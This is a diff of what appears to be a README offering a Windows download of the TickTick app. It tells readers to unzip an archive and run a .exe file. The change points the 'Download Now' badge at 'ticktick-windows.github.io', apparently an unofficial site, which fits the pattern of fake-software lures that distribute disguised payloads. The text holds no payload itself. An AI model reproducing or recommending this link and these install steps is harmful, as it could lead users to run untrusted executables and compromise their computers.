@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install TickTick on your PC.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://ticktick-windows.github.io/.github/)
 
 ## 📸 Overview
 ![Screenshot 1](https://66.media.tumblr.com/177485f59ef58ca9221fc00a60cf3102/tumblr_inline_p2la32ra0E1s0t9ry_540.png)  
